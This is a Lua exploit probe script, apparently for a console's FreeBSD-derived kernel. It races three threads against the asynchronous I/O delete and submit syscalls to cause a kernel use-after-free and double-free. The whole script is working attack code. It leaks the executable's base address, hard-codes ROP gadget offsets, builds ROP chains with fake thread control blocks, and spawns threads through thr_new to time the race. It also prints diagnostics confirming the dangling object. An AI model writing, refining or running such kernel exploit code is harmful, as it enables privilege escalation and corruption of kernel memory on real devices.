-- CRASH_CLASS: HIGH
-- PROBE 69p: 3-thread submit-during-delete for real AIO UAF
--
-- Context: 65l's "double-free" is actually double-SUCCESS — Thread B finds
-- NULL after Thread A already cleared the slot. Real UAF requires a THIRD
-- thread submitting between the two deleters:
--
--   Thread A: 662 delete — gets past NULL check on slot[i], about to free R
--   Thread C: 669 submit — allocates NEW R object into the same slot
--   Thread A: completes free — frees Thread C's NEW object (dangling!)
--   Thread B: 662 delete — finds Thread C's object and frees AGAIN → double-free
--
-- This is the decompile-verified path to real kernel UAF.
-- R object is 48 bytes in zone 0x1ab59e0, contains curthread pointers at +0x00/+0x08.
--
-- We verify UAF by querying Thread C's newly-submitted request after the race:
-- if 667(new_id) returns error/wrong data, the object was freed under it.

print("=== PROBE 69p: 3-THREAD SUBMIT-DURING-DELETE UAF ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

-- ============================================================
-- SETUP
-- ============================================================
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid_val
end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67  -- mov [rdi], rax; ret

-- Ignore SIGSEGV(11), SIGSYS(12), SIGPIPE(13)
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))  -- SIG_IGN
wd(N(sa_buf) + 8, 0)
wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Open /dev/zero for AIO
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

-- ============================================================
-- AIO HELPERS
-- ============================================================
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one(id_out_addr)
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))           -- offset
    wq(N(reqs) + 8, uint64(16))      -- nbytes
    wq(N(reqs) + 0x10, uint64(N(data_buf)))  -- buf
    wq(N(reqs) + 0x18, uint64(N(result_buf)))
    wd(N(reqs) + 0x20, fd_zero)      -- fd
    wd(N(reqs) + 0x24, 0)
    wd(N(id_out_addr), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_out_addr)))
    end)
    return rd(N(id_out_addr)) or 0
end

local function poll_one(id)
    local pid_buf = memory.alloc(8)
    local pst_buf = memory.alloc(8)
    wd(N(pid_buf), id)
    wd(N(pst_buf), 0)
    pcall(function()
        mk(664)(uint64(N(pid_buf)), uint64(1), uint64(N(pst_buf)))
    end)
end

local function query_one(id)
    local qid_buf = memory.alloc(8)
    local qst_buf = memory.alloc(8)
    wd(N(qid_buf), id)
    wd(N(qst_buf), 0xDEADBEEF)
    local ret = -999
    pcall(function()
        ret = sgn(mk(667)(uint64(N(qid_buf)), uint64(1), uint64(N(qst_buf))))
    end)
    local st = rd(N(qst_buf)) or 0xDEADBEEF
    return ret, st
end

-- ============================================================
-- GATE SETUP: 3 socketpairs for 3 children
-- ============================================================
print("")
print("-- GATE SETUP --")

local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF)
    wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp) + 4) or -1
    return r, w
end

local gate_a_r, gate_a_w = make_gate()
local gate_b_r, gate_b_w = make_gate()
local gate_c_r, gate_c_w = make_gate()
print(string.format("gates: A=%d/%d B=%d/%d C=%d/%d",
    gate_a_r, gate_a_w, gate_b_r, gate_b_w, gate_c_r, gate_c_w))
if gate_a_r < 0 or gate_b_r < 0 or gate_c_r < 0 then
    print("GATE FAIL"); return
end

-- Shared state
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local marker_C = memory.alloc(8)
local tmp_rd = memory.alloc(8)
local wbyte = memory.alloc(8)
wd(N(wbyte), 0x42)

-- Fake TCB for children (sysarch SET_FSBASE=129)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end

-- ============================================================
-- BUILD ROP CHAIN HELPER
-- ============================================================
local function build_rop_chain(stk_buf, stk_size, gate_rd_fd, marker_addr, action_gadgets)
    local sb = N(stk_buf)
    for i = 0, stk_size - 4, 4 do wd(sb + i, 0) end
    local sp = ((sb + stk_size) - ((sb + stk_size) % 16)) - 8
    local off = 0
    local function push(v) wq(sp + off, v); off = off + 8 end

    -- 1. sysarch(SET_FSBASE=129, &fake_tcb) — install fake TCB
    local tcb_ptr_buf = memory.alloc(8)
    wq(N(tcb_ptr_buf), uint64(N(fake_tcb)))
    push(g_pop_rax); push(uint64(165))  -- sysarch
    push(g_pop_rdi); push(uint64(129))  -- SET_FSBASE
    push(g_pop_rsi); push(uint64(N(tcb_ptr_buf)))
    push(stub)

    -- 2. Write marker (child alive and waiting)
    push(g_pop_rax); push(uint64(0xAAAA0000))
    push(g_pop_rdi); push(uint64(N(marker_addr)))
    push(g_mov_m_rax)

    -- 3. read(gate_fd, tmp, 1) — block until main fires
    push(g_pop_rax); push(uint64(3))  -- read
    push(g_pop_rdi); push(uint64(gate_rd_fd))
    push(g_pop_rsi); push(uint64(N(tmp_rd)))
    push(g_pop_rdx); push(uint64(1))
    push(stub)

    -- 4. Action-specific gadgets
    for _, g in ipairs(action_gadgets) do
        push(g)
    end

    -- 5. Write completion marker
    push(g_pop_rax); push(uint64(0xDDDD0000))
    push(g_pop_rdi); push(uint64(N(marker_addr)))
    push(g_mov_m_rax)

    -- 6. thr_exit(0)
    push(g_pop_rdi); push(uint64(0))
    push(g_pop_rax); push(uint64(431))
    push(stub)

    return sp
end

-- ============================================================
-- RACE LOOP
-- ============================================================
local ITERS = 30
local total_uaf = 0
local total_double = 0

print("")
print(string.format("-- 3-THREAD RACE: %d iterations --", ITERS))
print("Pattern: submit 1 → poll → children A(delete) + B(delete) + C(submit)")
print("         fire A first, then C, then B with micro-delays")
print("")

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Submit 1 AIO request and poll it (prerequisite for 662)
    local orig_id_buf = memory.alloc(8)
    local orig_id = submit_one(orig_id_buf)
    if orig_id == 0 then
        print(string.format("  iter %d: submit failed", iter))
        break
    end
    poll_one(orig_id)

    -- Verify original request is alive
    local qr, qs = query_one(orig_id)
    if qr ~= 0 or qs == 0xDEADBEEF then
        print(string.format("  iter %d: orig query failed ret=%d st=0x%X", iter, qr, qs))
        break
    end

    -- Shared delete ID array (1 entry = original ID)
    local del_ids = memory.alloc(8)
    wd(N(del_ids), orig_id)
    local del_states_A = memory.alloc(8)
    wd(N(del_states_A), 0xAA)
    local del_states_B = memory.alloc(8)
    wd(N(del_states_B), 0xBB)

    -- Thread C needs its own submit buffers in shared memory
    local c_reqs = memory.alloc(0x30)
    wq(N(c_reqs), uint64(0))
    wq(N(c_reqs) + 8, uint64(16))
    wq(N(c_reqs) + 0x10, uint64(N(data_buf)))
    wq(N(c_reqs) + 0x18, uint64(N(result_buf)))
    wd(N(c_reqs) + 0x20, fd_zero)
    wd(N(c_reqs) + 0x24, 0)
    local c_new_id = memory.alloc(8)
    wd(N(c_new_id), 0)

    -- Reset markers
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))
    wq(N(marker_C), uint64(0))

    -- Build child A: 662(del_ids, 1, states_A) — first deleter
    local stk_A = memory.alloc(0x4000)
    build_rop_chain(stk_A, 0x4000, gate_a_r, marker_A, {
        -- 662(del_ids, 1, states_A)
        g_pop_rdi, uint64(N(del_ids)),
        g_pop_rsi, uint64(1),
        g_pop_rdx, uint64(N(del_states_A)),
        g_pop_rax, uint64(662),
        stub,
    })

    -- Build child B: 662(del_ids, 1, states_B) — second deleter
    local stk_B = memory.alloc(0x4000)
    build_rop_chain(stk_B, 0x4000, gate_b_r, marker_B, {
        -- 662(del_ids, 1, states_B)
        g_pop_rdi, uint64(N(del_ids)),
        g_pop_rsi, uint64(1),
        g_pop_rdx, uint64(N(del_states_B)),
        g_pop_rax, uint64(662),
        stub,
    })

    -- Build child C: 669(1, reqs, 1, 1, new_id) — submit new request
    local stk_C = memory.alloc(0x4000)
    build_rop_chain(stk_C, 0x4000, gate_c_r, marker_C, {
        -- 669(cmd=1, reqs, count=1, class=1, ids)
        g_pop_rdi, uint64(1),
        g_pop_rsi, uint64(N(c_reqs)),
        g_pop_rdx, uint64(1),
        g_pop_rcx, uint64(1),
        g_pop_rax, uint64(669),
        stub,
    })

    -- Spawn all 3 children via thr_new(455)
    local function spawn_child(stk, sz)
        local pa = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
        wq(N(pa), g_bare_ret)           -- start_func = bare ret (ROP takes over)
        wq(N(pa) + 0x10, uint64(N(stk))) -- stack_base
        wq(N(pa) + 0x18, uint64(sz))     -- stack_size
        pcall(function() mk(455)(pa, uint64(0x38)) end)
    end

    spawn_child(stk_A, 0x4000)
    spawn_child(stk_B, 0x4000)
    spawn_child(stk_C, 0x4000)

    -- Wait for all 3 markers (alive and blocking on gate)
    local rdy_a, rdy_b, rdy_c = false, false, false
    for w = 1, 500000 do
        if not rdy_a then
            local v = rq(N(marker_A))
            if v and N(v) ~= 0 then rdy_a = true end
        end
        if not rdy_b then
            local v = rq(N(marker_B))
            if v and N(v) ~= 0 then rdy_b = true end
        end
        if not rdy_c then
            local v = rq(N(marker_C))
            if v and N(v) ~= 0 then rdy_c = true end
        end
        if rdy_a and rdy_b and rdy_c then break end
    end

    if not (rdy_a and rdy_b and rdy_c) then
        print(string.format("  iter %d: MARKER TIMEOUT a=%s b=%s c=%s",
            iter, tostring(rdy_a), tostring(rdy_b), tostring(rdy_c)))
        break
    end

    -- CRITICAL TIMING: fire A first (starts deleting), then C (submits into
    -- the same slot), then B (deletes C's new object)
    -- Fire A (first deleter)
    pcall(function() mk(4)(uint64(gate_a_w), uint64(N(wbyte)), uint64(1)) end)
    -- Micro-delay to let A reach the critical section
    for d = 1, 100 do local _ = rd(N(del_ids)) end
    -- Fire C (submitter — races into the slot A is about to free)
    pcall(function() mk(4)(uint64(gate_c_w), uint64(N(wbyte)), uint64(1)) end)
    -- Micro-delay
    for d = 1, 50 do local _ = rd(N(del_ids)) end
    -- Fire B (second deleter — should find C's new object)
    pcall(function() mk(4)(uint64(gate_b_w), uint64(N(wbyte)), uint64(1)) end)

    -- Wait for completion
    for w = 1, 200000 do
        local da = rq(N(marker_A))
        local db = rq(N(marker_B))
        local dc = rq(N(marker_C))
        if da and N(da) == 0xDDDD0000 and db and N(db) == 0xDDDD0000
            and dc and N(dc) == 0xDDDD0000 then break end
    end

    -- Check results
    local sA = rd(N(del_states_A)) or 0xAA
    local sB = rd(N(del_states_B)) or 0xBB
    local new_id = rd(N(c_new_id)) or 0
    local double = (sA == 0 and sB == 0)
    if double then total_double = total_double + 1 end

    -- Check if Thread C's new request is still valid
    local uaf = false
    if new_id ~= 0 then
        local nr, ns = query_one(new_id)
        if nr ~= 0 or ns == 0xDEADBEEF then
            uaf = true
            total_uaf = total_uaf + 1
        end
        print(string.format("  iter %2d: A_st=0x%X B_st=0x%X new_id=0x%X query=%d/0x%X %s%s",
            iter, sA, sB, new_id, nr, ns,
            double and "DOUBLE " or "",
            uaf and "*** UAF ***" or ""))
    else
        print(string.format("  iter %2d: A_st=0x%X B_st=0x%X new_id=0 (C submit failed) %s",
            iter, sA, sB,
            double and "DOUBLE" or ""))
    end

    if not alive() then print("DEAD after iter " .. iter); break end
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print(string.format("RESULTS: %d iters, %d doubles, %d UAF", ITERS, total_double, total_uaf))
if total_uaf > 0 then
    print("*** REAL UAF CONFIRMED: submit-during-delete produces dangling R objects ***")
    print("*** Thread C's request object was freed under it by Thread A/B ***")
else
    print("No UAF detected. Timing may need adjustment (delay counts).")
    print("Try: increase micro-delay between A and C, or use more iterations.")
end
print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69p COMPLETE ===")
